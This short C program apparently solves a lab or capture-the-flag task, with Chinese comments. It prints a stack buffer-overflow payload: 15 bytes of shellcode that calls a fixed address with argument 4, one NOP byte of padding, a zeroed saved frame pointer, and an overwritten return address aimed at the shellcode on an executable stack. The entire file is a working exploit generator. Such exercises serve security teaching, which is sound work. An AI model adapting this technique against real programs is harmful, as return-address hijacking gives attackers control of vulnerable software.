/* Task 2: 栈上执行 15 字节 shellcode,固定 RWX 栈 */
#include <stdio.h>

static void w8(unsigned long long v){ for(int i=0;i<8;i++) fputc((v>>(8*i))&0xff,stdout); }
static void wb(const unsigned char *b,int n){ for(int i=0;i<n;i++) fputc(b[i],stdout); }

int main(void){
    const unsigned char sc[] = {
        0x6a,0x04,                        /* push $0x4        */
        0x5f,                             /* pop  %rdi        */
        0x48,0xb8, 0x87,0x1a,0x40,0x00,0x00,0x00,0x00,0x00,  /* movabs $0x401a87,%rax */
        0xff,0xd0                         /* call *%rax       */
    };
    wb(sc, 15);
    fputc(0x90, stdout);                  /* nop 凑满 16 字节缓冲区 */
    w8(0ULL);                             /* saved rbp */
    w8(0x721000800FD0ULL);                /* 返回地址 -> 栈上 shellcode */
    return 0;
}
